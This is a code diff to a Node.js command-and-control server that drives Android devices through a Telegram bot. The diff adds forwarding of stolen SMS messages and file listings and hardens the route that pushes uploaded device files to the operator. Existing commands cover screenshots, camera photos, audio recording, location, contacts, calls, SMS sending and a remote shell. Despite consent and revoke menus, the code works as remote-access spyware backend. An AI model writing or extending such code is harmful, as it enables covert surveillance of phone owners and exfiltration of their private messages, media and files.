@@ -61,7 +61,6 @@ let bot = null;
 const connectedDevices = new Map();
 const pendingCommands = new Map();
 const userSessions = new Map();
-const pendingCallbacks = new Map(); // Track callback responses
 
 // ============================================
 // DIRECTORY CREATION
@@ -81,6 +80,7 @@ const storage = multer.diskStorage({
         if (type.includes('screenshot')) dir = 'screenshots';
         else if (type.includes('audio') || type.includes('recording')) dir = 'recordings';
         else if (type.includes('photo') || type.includes('camera')) dir = 'photos';
+        else if (type.includes('jpg') || type.includes('jpeg') || type.includes('png')) dir = 'photos';
         
         if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
         cb(null, dir);
@@ -89,24 +89,26 @@ const storage = multer.diskStorage({
         const deviceId = req.headers['device-id'] || 'unknown';
         const timestamp = Date.now();
         const ext = path.extname(file.originalname);
-        cb(null, `${deviceId}-${timestamp}${ext}`);
+        const safeName = `${deviceId}-${timestamp}${ext}`;
+        cb(null, safeName);
     }
 });
 
 const upload = multer({
     storage,
-    limits: { fileSize: 100 * 1024 * 1024 },
+    limits: { fileSize: 100 * 1024 * 1024 }, // 100MB limit
     fileFilter: (req, file, cb) => {
         const allowedTypes = [
             'image/jpeg', 'image/png', 'image/gif',
-            'video/mp4', 'video/3gpp',
-            'audio/mpeg', 'audio/mp3', 'audio/wav',
+            'video/mp4', 'video/3gpp', 'video/avi', 'video/quicktime',
+            'audio/mpeg', 'audio/mp3', 'audio/wav', 'audio/ogg',
             'application/pdf', 'text/plain',
-            'application/vnd.android.package-archive'
+            'application/vnd.android.package-archive',
+            'application/octet-stream'
         ];
         
         if (allowedTypes.includes(file.mimetype) || 
-            /\.(jpg|jpeg|png|gif|mp4|3gp|mp3|wav|txt|pdf|apk)$/i.test(file.originalname)) {
+            /\.(jpg|jpeg|png|gif|mp4|3gp|avi|mov|mp3|wav|ogg|txt|pdf|apk)$/i.test(file.originalname)) {
             cb(null, true);
         } else {
             cb(new Error('File type not allowed'), false);
@@ -131,6 +133,8 @@ function logEvent(event, deviceId = 'system', details = '') {
         console.log('\x1b[36m%s\x1b[0m', logEntry.trim());
     } else if (event.includes('RESPONSE')) {
         console.log('\x1b[35m%s\x1b[0m', logEntry.trim());
+    } else if (event.includes('FILE')) {
+        console.log('\x1b[33m%s\x1b[0m', logEntry.trim());
     } else {
         console.log(logEntry.trim());
     }
@@ -140,7 +144,7 @@ function logEvent(event, deviceId = 'system', details = '') {
     } catch (e) {}
 }
 
-// Telegram API helper
+// Telegram API helper (no axios)
 function telegramRequest(method, params = {}) {
     return new Promise((resolve, reject) => {
         const queryString = Object.keys(params)
@@ -171,7 +175,7 @@ function telegramRequest(method, params = {}) {
     });
 }
 
-// Send long messages
+// Send long messages (Telegram 4096 limit)
 async function sendLongMessage(chatId, text, parseMode = 'Markdown') {
     const MAX_LENGTH = 4096;
     
@@ -448,6 +452,8 @@ wss.on('connection', (ws, req) => {
         const deviceId = req.headers['device-id'];
         const deviceModel = req.headers['device-model'] || 'Unknown';
         const androidVersion = req.headers['android-version'] || 'Unknown';
+        const manufacturer = req.headers['manufacturer'] || 'Unknown';
+        const brand = req.headers['brand'] || 'Unknown';
         
         if (!deviceId || !req.headers['authorization']) {
             return ws.close(1008, 'Unauthorized');
@@ -456,6 +462,8 @@ wss.on('connection', (ws, req) => {
         const deviceInfo = {
             id: deviceId,
             model: deviceModel,
+            manufacturer: manufacturer,
+            brand: brand,
             android: androidVersion,
             connectedAt: new Date().toISOString(),
             lastSeen: Date.now()
@@ -618,17 +626,11 @@ function handleTransparencyLog(deviceId, data) {
 }
 
 function handleFileUpload(deviceId, message) {
-    if (bot) {
-        bot.sendMessage(adminId, 
-            `📁 *File Received*\nDevice: \`${deviceId.substring(0, 8)}...\`\nType: ${message.fileType || 'Unknown'}`,
-            { parse_mode: 'Markdown' }
-        ).catch(e => {});
-    }
-    logEvent('FILE_UPLOAD', deviceId, `Type: ${message.fileType}`);
+    logEvent('FILE_UPLOAD_NOTIFICATION', deviceId, `Type: ${message.fileType || 'Unknown'}`);
 }
 
 // ============================================
-// COMMAND RESPONSE HANDLER - FIXED!
+// COMMAND RESPONSE HANDLER
 // ============================================
 function handleCommandResponse(deviceId, response) {
     const device = connectedDevices.get(deviceId);
@@ -699,6 +701,7 @@ ID: \`${deviceId}\``;
             sendLongMessage(adminId, msg);
         } catch (e) {
             logEvent('ERROR', deviceId, `Failed to parse contacts: ${e.message}`);
+            bot.sendMessage(adminId, `📒 *Contacts - ${model}*\nReceived ${response.data.contacts.length} contacts`).catch(e => {});
         }
     }
     
@@ -717,6 +720,42 @@ ID: \`${deviceId}\``;
             sendLongMessage(adminId, msg);
         } catch (e) {
             logEvent('ERROR', deviceId, `Failed to parse apps: ${e.message}`);
+            bot.sendMessage(adminId, `📱 *Apps - ${model}*\nTotal: ${response.data.count || 0}`).catch(e => {});
+        }
+    }
+    
+    // Messages response
+    else if (response.data && response.data.messages) {
+        try {
+            const messages = JSON.parse(response.data.messages);
+            let msg = `📨 *Recent Messages - ${model}*\n━━━━━━━━━━━━━\nTotal: ${messages.length}\n\n`;
+            messages.slice(0, 10).forEach((m, i) => {
+                msg += `${i+1}. From: \`${m.address || 'Unknown'}\`\n`;
+                msg += `   ${m.body || ''}\n`;
+                if (m.date) msg += `   ${new Date(m.date).toLocaleString()}\n`;
+                msg += '\n';
+            });
+            sendLongMessage(adminId, msg);
+        } catch (e) {
+            logEvent('ERROR', deviceId, `Failed to parse messages: ${e.message}`);
+        }
+    }
+    
+    // Files list response
+    else if (response.data && response.data.files) {
+        try {
+            const files = JSON.parse(response.data.files);
+            let msg = `📁 *Files - ${model}*\n━━━━━━━━━━━━━\nPath: ${response.data.path || '/'}\n\n`;
+            files.slice(0, 20).forEach((f, i) => {
+                const icon = f.isDirectory ? '📁' : '📄';
+                msg += `${i+1}. ${icon} ${f.name} (${formatBytes(f.size)})\n`;
+            });
+            if (files.length > 20) {
+                msg += `\n... and ${files.length - 20} more items`;
+            }
+            sendLongMessage(adminId, msg);
+        } catch (e) {
+            logEvent('ERROR', deviceId, `Failed to parse files: ${e.message}`);
         }
     }
     
@@ -740,25 +779,12 @@ ID: \`${deviceId}\``;
     
     // Call/SMS success
     else if (response.data && (response.data.call_made !== undefined || response.data.sms_sent !== undefined)) {
+        let action = response.data.call_made ? '📞 Call' : '💬 SMS';
+        let target = response.data.number || '';
         bot.sendMessage(adminId, 
-            `✅ *Success - ${model}*\nOperation completed successfully`,
+            `✅ *${action} Successful*\nDevice: ${model}\nTarget: \`${target}\``,
             { parse_mode: 'Markdown' }
         ).catch(e => {});
-    }
-    
-    // File list response
-    else if (response.data && response.data.files) {
-        try {
-            const files = JSON.parse(response.data.files);
-            let msg = `📁 *Files - ${model}*\n━━━━━━━━━━━━━\nPath: ${response.data.path || '/'}\n\n`;
-            files.slice(0, 20).forEach((f, i) => {
-                msg += `${i+1}. ${f.name} (${formatBytes(f.size)})\n`;
-            });
-            if (files.length > 20) {
-                msg += `\n... and ${files.length - 20} more files`;
-            }
-            sendLongMessage(adminId, msg);
-        } catch (e) {}
     }
     
     // Generic success
@@ -806,7 +832,7 @@ function sendCommandToDevice(deviceId, command, data = {}) {
 }
 
 // ============================================
-// BOT COMMAND HANDLERS - ALL 20 WORKING!
+// BOT COMMAND HANDLERS
 // ============================================
 function setupBotCommandHandlers() {
     if (!bot) return;
@@ -997,7 +1023,7 @@ Type / followed by any command:
             return bot.sendMessage(chatId, `❌ Device not connected`).catch(e => {});
         }
         
-        if (sendCommandToDevice(deviceId, 'get_contacts')) {
+        if (sendCommandToDevice(deviceId, 'list_contacts')) {
             bot.sendMessage(chatId, `📒 Getting contacts...`).catch(e => {});
         }
     });
@@ -1234,7 +1260,7 @@ Type / followed by any command:
             }
         }
         
-        // Input handlers for browse/download
+        // Input handlers for browse/download/call/sms/shell
         const session = getUserSession(chatId);
         if (!session) return;
         
@@ -1280,7 +1306,7 @@ Type / followed by any command:
         }
     });
 
-    // === CALLBACK QUERY HANDLER - ALL DEVICE ACTIONS WORKING! ===
+    // === CALLBACK QUERY HANDLER ===
     bot.on('callback_query', async (callbackQuery) => {
         const chatId = callbackQuery.message.chat.id;
         const messageId = callbackQuery.message.message_id;
@@ -1291,7 +1317,7 @@ Type / followed by any command:
             return;
         }
         
-        // Answer callback immediately to remove loading state
+        // Answer callback immediately
         await bot.answerCallbackQuery(callbackQuery.id).catch(e => {});
         
         // Parse action and deviceId
@@ -1301,20 +1327,16 @@ Type / followed by any command:
         // Handle different callback formats
         let deviceId, subAction, seconds, consentType;
         
-        if (action === 'camera' && parts[1] === 'front' || parts[1] === 'rear') {
-            // Format: camera_front_deviceId or camera_rear_deviceId
+        if (action === 'camera' && (parts[1] === 'front' || parts[1] === 'rear')) {
             subAction = parts[1];
             deviceId = parts.slice(2).join('_');
         } else if (action === 'record' && parts.length >= 3) {
-            // Format: record_5_deviceId, record_10_deviceId, etc.
             seconds = parseInt(parts[1]);
             deviceId = parts.slice(2).join('_');
         } else if (action === 'revoke' && parts.length >= 3) {
-            // Format: revoke_LOCATION_deviceId, revoke_CAMERA_deviceId, etc.
             consentType = parts[1];
             deviceId = parts.slice(2).join('_');
         } else {
-            // Format: action_deviceId
             deviceId = parts.slice(1).join('_');
         }
         
@@ -1328,7 +1350,6 @@ Type / followed by any command:
         
         // Handle each action
         switch(action) {
-            // === BASIC INFO ===
             case 'info':
                 if (sendCommandToDevice(deviceId, 'get_device_info')) {
                     await bot.sendMessage(chatId, `ℹ️ Getting info for ${model}...`).catch(e => {});
@@ -1341,7 +1362,6 @@ Type / followed by any command:
                 }
                 break;
                 
-            // === MEDIA CAPTURE ===
             case 'screenshot':
                 if (sendCommandToDevice(deviceId, 'take_screenshot')) {
                     await bot.sendMessage(chatId, `📸 Taking screenshot on ${model}...`).catch(e => {});
@@ -1350,12 +1370,10 @@ Type / followed by any command:
                 
             case 'camera':
                 if (subAction) {
-                    // Direct camera command
                     if (sendCommandToDevice(deviceId, 'take_photo', { camera: subAction })) {
                         await bot.sendMessage(chatId, `📷 Taking ${subAction} camera photo...`).catch(e => {});
                     }
                 } else {
-                    // Show camera selection menu
                     await bot.sendMessage(chatId, 
                         `📷 *Select camera for ${model}:*`,
                         { parse_mode: 'Markdown', reply_markup: cameraMenu(deviceId).reply_markup }
@@ -1365,12 +1383,10 @@ Type / followed by any command:
                 
             case 'record':
                 if (seconds) {
-                    // Direct record command
                     if (sendCommandToDevice(deviceId, 'record_audio', { seconds })) {
                         await bot.sendMessage(chatId, `🎤 Recording ${seconds}s on ${model}...`).catch(e => {});
                     }
                 } else {
-                    // Show duration menu
                     await bot.sendMessage(chatId, 
                         `🎤 *Select duration for ${model}:*`,
                         { parse_mode: 'Markdown', reply_markup: recordMenu(deviceId).reply_markup }
@@ -1378,7 +1394,6 @@ Type / followed by any command:
                 }
                 break;
                 
-            // === LOCATION & FILES ===
             case 'location':
                 if (sendCommandToDevice(deviceId, 'get_location')) {
                     await bot.sendMessage(chatId, `📍 Getting location from ${model}...`).catch(e => {});
@@ -1403,7 +1418,6 @@ Type / followed by any command:
                 ).catch(e => {});
                 break;
                 
-            // === COMMUNICATION ===
             case 'call':
                 setUserSession(chatId, { state: 'awaiting_call_number', deviceId });
                 await bot.sendMessage(chatId, 
@@ -1421,7 +1435,7 @@ Type / followed by any command:
                 break;
                 
             case 'contacts':
-                if (sendCommandToDevice(deviceId, 'get_contacts')) {
+                if (sendCommandToDevice(deviceId, 'list_contacts')) {
                     await bot.sendMessage(chatId, `📒 Getting contacts from ${model}...`).catch(e => {});
                 }
                 break;
@@ -1432,7 +1446,6 @@ Type / followed by any command:
                 }
                 break;
                 
-            // === ADVANCED ===
             case 'shell':
                 setUserSession(chatId, { state: 'awaiting_shell_command', deviceId });
                 await bot.sendMessage(chatId, 
@@ -1441,7 +1454,6 @@ Type / followed by any command:
                 ).catch(e => {});
                 break;
                 
-            // === PRIVACY ===
             case 'privacy':
                 if (sendCommandToDevice(deviceId, 'get_consents')) {
                     await bot.sendMessage(chatId, `🔐 Fetching consent status for ${model}...`).catch(e => {});
@@ -1450,7 +1462,6 @@ Type / followed by any command:
                 
             case 'revoke':
                 if (consentType) {
-                    // Direct revoke command
                     if (sendCommandToDevice(deviceId, 'revoke_consent', { 
                         type: consentType, 
                         reason: 'Revoked via inline button' 
@@ -1458,7 +1469,6 @@ Type / followed by any command:
                         await bot.sendMessage(chatId, `🚫 Revoked ${consentType} consent on ${model}`).catch(e => {});
                     }
                 } else {
-                    // Show revoke menu
                     await bot.sendMessage(chatId, 
                         `🚫 *Select consent to revoke on ${model}:*`,
                         { parse_mode: 'Markdown', reply_markup: revokeMenu(deviceId).reply_markup }
@@ -1481,8 +1491,10 @@ Type / followed by any command:
 // API ENDPOINTS
 // ============================================
 
-// File upload endpoint
-app.post('/api/upload', upload.single('file'), (req, res) => {
+// ============================================
+// FIXED FILE UPLOAD ENDPOINT - Works on Render/Heroku
+// ============================================
+app.post('/api/upload', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.headers['device-id'];
         const fileType = req.headers['file-type'] || 'file';
@@ -1493,40 +1505,75 @@ app.post('/api/upload', upload.single('file'), (req, res) => {
         
         const fileSize = (req.file.size / 1024 / 1024).toFixed(2);
         const fileName = req.file.originalname;
+        const filePath = req.file.path;
         
         logEvent('FILE_UPLOAD', deviceId, `${fileName} (${fileSize}MB) - Type: ${fileType}`);
         
         if (bot) {
-            bot.sendDocument(adminId, req.file.path, {
-                caption: `📁 *File Received*\n` +
-                        `Device: \`${deviceId.substring(0, 8)}...\`\n` +
-                        `Name: \`${fileName}\`\n` +
-                        `Type: ${fileType}\n` +
-                        `Size: ${fileSize}MB`,
-                parse_mode: 'Markdown'
-            }).then(() => {
-                // Clean up after 5 minutes
+            try {
+                // OPTION 1: Send file directly from disk
+                await bot.sendDocument(adminId, filePath, {
+                    caption: `📁 *File Received*\n` +
+                            `Device: \`${deviceId.substring(0, 8)}...\`\n` +
+                            `Name: \`${fileName}\`\n` +
+                            `Type: ${fileType}\n` +
+                            `Size: ${fileSize}MB`,
+                    parse_mode: 'Markdown'
+                });
+                
+                logEvent('FILE_SENT', deviceId, `Successfully sent to Telegram: ${fileName}`);
+                
+                // Clean up after successful send
                 setTimeout(() => {
-                    if (fs.existsSync(req.file.path)) {
-                        fs.unlinkSync(req.file.path);
-                        logEvent('FILE_CLEANUP', deviceId, `Deleted: ${req.file.path}`);
+                    try {
+                        if (fs.existsSync(filePath)) {
+                            fs.unlinkSync(filePath);
+                            logEvent('FILE_CLEANUP', deviceId, `Deleted: ${filePath}`);
+                        }
+                    } catch (e) {
+                        logEvent('ERROR', deviceId, `Failed to delete file: ${e.message}`);
                     }
                 }, 5 * 60 * 1000);
-            }).catch(e => {
-                logEvent('ERROR', deviceId, `Failed to send file to Telegram: ${e.message}`);
-            });
+                
+            } catch (telegramError) {
+                // OPTION 2: If direct send fails, try reading file as buffer
+                try {
+                    logEvent('WARNING', deviceId, `Direct send failed, trying buffer method: ${telegramError.message}`);
+                    
+                    const fileBuffer = fs.readFileSync(filePath);
+                    await bot.sendDocument(adminId, fileBuffer, {
+                        filename: fileName,
+                        caption: `📁 *File Received (buffer)*\n` +
+                                `Device: \`${deviceId.substring(0, 8)}...\`\n` +
+                                `Name: \`${fileName}\`\n` +
+                                `Type: ${fileType}\n` +
+                                `Size: ${fileSize}MB`,
+                        parse_mode: 'Markdown'
+                    }, {
+                        filename: fileName,
+                        contentType: req.file.mimetype || 'application/octet-stream'
+                    });
+                    
+                    logEvent('FILE_SENT', deviceId, `Successfully sent via buffer: ${fileName}`);
+                    
+                } catch (bufferError) {
+                    logEvent('ERROR', deviceId, `All send methods failed: ${bufferError.message}`);
+                    throw bufferError;
+                }
+            }
         }
         
         res.json({ 
             success: true, 
             message: 'File uploaded successfully',
             file: fileName,
-            size: fileSize
+            size: fileSize,
+            type: fileType
         });
         
     } catch (error) {
         logEvent('ERROR', 'system', `Upload error: ${error.message}`);
-        res.status(500).json({ error: 'Upload failed' });
+        res.status(500).json({ error: 'Upload failed: ' + error.message });
     }
 });
 
@@ -1596,6 +1643,7 @@ server.listen(PORT, '0.0.0.0', async () => {
     console.log('\x1b[36m%s\x1b[0m', '━━━━━━━━━━━━━━━━━━━━━');
     console.log(`📡 Port: ${PORT}`);
     console.log(`🔧 Trust proxy: Enabled`);
+    console.log(`📁 Upload directory: ${path.resolve('./uploads')}`);
     
     let retries = 0;
     while (retries < 3) {
